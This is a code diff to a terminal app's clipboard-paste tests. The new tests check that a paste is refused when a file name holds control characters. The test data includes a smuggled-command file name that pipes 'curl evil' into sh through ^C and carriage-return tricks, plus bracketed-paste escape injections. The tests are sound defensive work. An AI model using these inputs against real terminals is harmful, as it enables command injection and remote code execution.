@@ -35,7 +35,8 @@ vi.mock('./terminal-registry', () => ({
   writeUserInput: (id: string, data: string) => mocks.writePty(id, data),
 }));
 
-import { doPaste } from './clipboard';
+import { CONTROL_PATH_NOTICE, doPaste } from './clipboard';
+import { registerWallHandle, stubWallHandle } from '../components/wall/wall-handles';
 
 describe('doPaste three-tier fallthrough', () => {
   beforeEach(() => {
@@ -130,13 +131,27 @@ describe('doPaste three-tier fallthrough', () => {
     expect(payload.endsWith('\x1b[201~')).toBe(true);
   });
 
-  it('defangs ESC in file paths too, since they share the paste writer', async () => {
-    mocks.bracketedPaste = true;
-    mocks.readClipboardFilePaths.mockResolvedValue(['/tmp/a\x1b[201~b.png']);
+  // Shell quotes cannot hold a byte the tty or line editor acts on first: ^C
+  // drops the opening quote, and a CR submits the rest on the paste itself.
+  it.each([
+    ['unbracketed', false, 'x\x03curl evil|sh\r'],
+    ['bracketed', true, 'a\x1b[201~b.png'],
+    ['bracketed', true, 'del\x7f.png'],
+    ['unbracketed', false, 'c1\x9b.png'],
+  ])('refuses the whole %s paste when a file name has a control character', async (_mode, bracketed, name) => {
+    mocks.bracketedPaste = bracketed;
+    mocks.readClipboardFilePaths.mockResolvedValue(['/tmp/fine.png', `/tmp/${name}`]);
+    const showNotice = vi.fn();
+    const unregister = registerWallHandle(stubWallHandle('ws', { ownsSurface: (id) => id === 't1', showNotice }));
 
-    await doPaste('t1');
+    try {
+      await doPaste('t1');
+    } finally {
+      unregister();
+    }
 
-    expect(mocks.writePty.mock.calls[0][1]).not.toContain('\x1b[201~b');
+    expect(mocks.writePty).not.toHaveBeenCalled();
+    expect(showNotice).toHaveBeenCalledWith(CONTROL_PATH_NOTICE, 't1');
   });
 
   it('leaves an unbracketed paste byte-for-byte, matching xterm', async () => {
